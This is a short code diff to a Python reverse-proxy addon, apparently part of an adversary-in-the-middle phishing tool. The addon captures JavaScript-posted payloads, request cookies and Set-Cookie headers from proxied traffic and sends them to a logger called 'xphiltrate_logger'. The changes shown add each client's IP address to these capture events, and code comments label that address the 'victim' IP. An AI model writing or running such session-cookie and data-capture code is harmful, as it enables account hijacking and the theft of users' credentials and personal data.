@@ -78,13 +78,12 @@ class ReverseProxyAddon:
                     try:
                         body = json.loads(flow.request.get_text())
                         # Capture the Client's IP address - integratiotn with xphiltrate_logger on 4/5
-                        client_ip = flow.client_conn.peername[0]
                         self.logger.process_event(
                             f"JS_CAPTURE_{body.get('type', 'UNK').upper()}",
                             body.get("url", flow.request.pretty_url),
                             "POST",
                             body.get("payload", {}),
-                            client_ip
+                            flow.client_conn.peername[0] # victim_ip
                         )
                     except Exception as e:
                         logging.warning(f"Capture parse error: {e}")
@@ -111,7 +110,8 @@ class ReverseProxyAddon:
                         "HEADER_COOKIE_CAPTURE", 
                         flow.request.pretty_url, 
                         "COOKIE", 
-                        captured_cookies
+                        captured_cookies,
+                        flow.client_conn.peername[0] # victim's ip
                     )
 
             # Reverse Proxy Forwarding Logic
@@ -152,7 +152,8 @@ class ReverseProxyAddon:
                 self.logger.process_event("SET_COOKIE_CAPTURE", 
                                           flow.request.url, 
                                           "SET-COOKIE", 
-                                          captured_set_cookies)
+                                          captured_set_cookies,
+                                          flow.client_conn.peername[0] )
 
 def main():
     parser = argparse.ArgumentParser()
